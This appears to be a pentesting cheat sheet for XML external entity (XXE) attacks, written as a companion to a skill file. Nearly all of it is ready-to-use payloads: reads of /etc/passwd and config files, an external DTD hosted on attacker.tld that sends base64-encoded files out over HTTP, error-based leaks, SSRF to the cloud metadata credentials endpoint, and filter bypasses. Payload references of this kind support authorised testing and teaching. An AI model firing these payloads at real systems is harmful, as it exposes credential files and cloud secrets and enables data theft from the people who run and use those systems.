# XXE cheat sheet

Companion to `SKILL.md`. Try in-band first; if the response doesn't echo, go blind (OOB) with an
external DTD, then error-based. Also test every XML entry point (SOAP, SVG, DOCX/XLSX, SAML, RSS).

## In-band file read (response reflects the entity)
```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<r>&xxe;</r>
```
Windows: `file:///c:/windows/win.ini`. For source with special chars, use PHP filter (below).

## PHP wrapper (base64 the file so XML doesn't choke on it)
```xml
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php"> ]>
<r>&xxe;</r>
```

## Blind / OOB (no reflection) — host an external DTD
```xml
<!-- request body -->
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://attacker.tld/x.dtd"> %ext; ]>
<r>&send;</r>
```
```xml
<!-- x.dtd on attacker.tld : exfil a file over HTTP/DNS -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.tld/?x=%file;'>">
%eval;
```
Just a callback (prove XXE / SSRF): `<!ENTITY % ext SYSTEM "http://oob.attacker.tld/ping"> %ext;`

## Error-based (leak file contents via parser error)
```xml
<!-- x.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
%eval; %err;
```
The parser error message includes the file contents.

## SSRF via XXE (reach internal / cloud metadata)
```xml
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<r>&xxe;</r>
```

## Entry points beyond obvious XML bodies
```
Content-Type flip   send XML to a JSON endpoint: change Content-Type: application/xml + XML body
SVG upload          <svg><image xlink:href="...file///etc/passwd"...>  (see web-file-upload)
Office docs         .docx/.xlsx/.pptx are ZIPs — inject XXE into word/document.xml, repackage
SAML                XXE in the SAMLResponse (also see web-saml)
SOAP / RSS / XML-RPC / config uploads
```

## Bypasses
```
DOCTYPE filtered    UTF-16/UTF-7 encode the payload; or use XInclude (below)
XInclude (no DOCTYPE control)
  <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
parameter entities  use % entities (needed inside external DTD anyway)
```

## Verify
File contents returned in-band, an OOB callback carrying a file, or a parser error leaking the file.
For metadata/SSRF, show one internal response. Don't exfil real user data.

## References
PortSwigger XXE labs; PayloadsAllTheThings (XXE); OWASP XXE Prevention.
